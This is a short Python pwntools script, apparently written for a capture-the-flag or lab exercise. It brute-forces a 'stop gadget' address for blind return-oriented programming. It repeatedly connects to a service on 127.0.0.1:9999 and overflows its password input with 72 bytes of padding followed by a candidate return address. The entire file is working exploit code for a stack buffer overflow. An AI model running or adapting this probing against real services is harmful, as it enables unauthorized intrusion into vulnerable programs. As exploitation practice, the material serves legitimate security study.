from pwn import*
def get_stop_addr(length):
	addr = 0x400000
	while 1:
		try:
			sh = remote('127.0.0.1', 9999)
			sh.recvuntil('password?\n')
			payload = 'U' * length + p64(addr)
			sh.sendline(payload)
			content = sh.recv()
			print content
			sh.close()
			print 'one success stop gadget addr: 0x%x' % (addr)
		except Exception:
			addr += 1
			sh.close()
len = get_stop_addr(72)
print len
